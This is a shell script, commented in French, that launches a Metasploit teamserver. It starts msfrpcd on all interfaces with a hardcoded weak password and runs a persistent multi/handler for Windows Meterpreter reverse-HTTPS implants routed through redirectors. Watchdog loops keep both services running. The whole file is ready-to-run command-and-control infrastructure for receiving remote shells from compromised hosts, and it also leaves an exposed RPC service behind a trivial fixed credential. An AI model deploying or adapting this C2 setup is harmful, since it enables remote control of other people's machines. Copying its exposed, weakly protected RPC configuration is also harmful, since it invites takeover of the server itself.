#!/bin/sh
# start_msf_server.sh — Démarre msfrpcd en mode teamserver partagé (0.0.0.0)
# Utilisé par le service msf-teamserver (un seul par cluster)
set -e

PG_USER="${PG_USER:-postgres}"
PG_PASSWORD="${PG_PASSWORD:-${POSTGRES_PASSWORD:-}}"
[ -z "$PG_PASSWORD" ] && [ -f /run/secrets/postgres_password ] && PG_PASSWORD=$(cat /run/secrets/postgres_password)
PG_HOST="${PG_HOST:-postgres}"
PG_DBNAME="${PG_DBNAME:-msf}"
MSF_PASS="totototo"
MSF_PORT=55553

mkdir -p /opt/metasploit/.msf4
cat > /opt/metasploit/.msf4/database.yml <<EOF
production:
  adapter: postgresql
  database: ${PG_DBNAME}
  username: ${PG_USER}
  password: ${PG_PASSWORD}
  host: ${PG_HOST}
  port: 5432
  pool: 20
  timeout: 5
EOF

echo "[INFO] Starting msfrpcd teamserver on 0.0.0.0:${MSF_PORT}..."
cd /opt/metasploit
./msfrpcd -P "${MSF_PASS}" -a 0.0.0.0 -p ${MSF_PORT}

# Attendre que msfrpcd soit prêt
i=0
while [ $i -lt 180 ]; do
    if nc -z 127.0.0.1 ${MSF_PORT} 2>/dev/null; then
        echo "[INFO] msfrpcd ready after ${i}s"
        break
    fi
    sleep 1
    i=$((i + 1))
done

if ! nc -z 127.0.0.1 ${MSF_PORT} 2>/dev/null; then
    echo "[ERROR] msfrpcd failed to start after 180s"
    exit 1
fi

echo "[INFO] Rebuilding module cache (once at startup)..."
./msfconsole -q -x "db_rebuild_cache; exit" 2>&1 | tail -3
echo "[INFO] Module cache ready."

# ── C2 Listener — Meterpreter HTTPS reverse (reçoit les implants via redirecteurs) ──
C2_LPORT="${LPORT_BIND:-4444}"
C2_REDIRECTORS="${C2_REDIRECTORS:-}"

echo "[INFO] Starting C2 multi/handler on 0.0.0.0:${C2_LPORT}..."
cat > /tmp/c2_handler.rc << RCEOF
use multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_https
set LHOST 0.0.0.0
set LPORT ${C2_LPORT}
set ExitOnSession false
set SessionCommunicationTimeout 600
set SessionExpirationTimeout 0
$([ -n "$C2_REDIRECTORS" ] && echo "set OverrideLHOST $(echo "$C2_REDIRECTORS" | cut -d',' -f1)")
$([ -n "$C2_REDIRECTORS" ] && echo "set OverrideLPORT 443")
$([ -n "$C2_REDIRECTORS" ] && echo "set OverrideRequestTimeout 5")
run -j
RCEOF

# tail -f /dev/null pipe keeps stdin open → msfconsole ne quitte pas après le fichier rc
tail -f /dev/null | ./msfconsole -q -r /tmp/c2_handler.rc 2>&1 &
MSF_PID=$!

# Attendre que le handler soit réellement en écoute sur C2_LPORT
i=0
while [ $i -lt 120 ]; do
    if nc -z 127.0.0.1 ${C2_LPORT} 2>/dev/null; then
        echo "[INFO] C2 listener ready on :${C2_LPORT} after ${i}s"
        break
    fi
    sleep 1
    i=$((i + 1))
done

if ! nc -z 127.0.0.1 ${C2_LPORT} 2>/dev/null; then
    echo "[WARN] C2 listener not detected on :${C2_LPORT} after 120s — handler may still be loading"
fi

echo "[INFO] Teamserver running. msfrpcd=:${MSF_PORT} handler=:${C2_LPORT}"

# Garder le container vivant ; surveiller msfrpcd ET msfconsole
while true; do
    sleep 30

    # Watchdog msfrpcd
    if ! nc -z 127.0.0.1 ${MSF_PORT} 2>/dev/null; then
        echo "[WARN] msfrpcd down — restarting..."
        ./msfrpcd -P "${MSF_PASS}" -a 0.0.0.0 -p ${MSF_PORT}
        i=0
        while [ $i -lt 180 ]; do
            if nc -z 127.0.0.1 ${MSF_PORT} 2>/dev/null; then
                echo "[INFO] msfrpcd restarted after ${i}s"
                break
            fi
            sleep 1
            i=$((i + 1))
        done
        if ! nc -z 127.0.0.1 ${MSF_PORT} 2>/dev/null; then
            echo "[ERROR] msfrpcd failed to restart after 180s — exiting"
            exit 1
        fi
    fi

    # Watchdog msfconsole
    if ! kill -0 $MSF_PID 2>/dev/null; then
        echo "[WARN] msfconsole exited — restarting handler..."
        tail -f /dev/null | ./msfconsole -q -r /tmp/c2_handler.rc 2>&1 &
        MSF_PID=$!
    fi
done
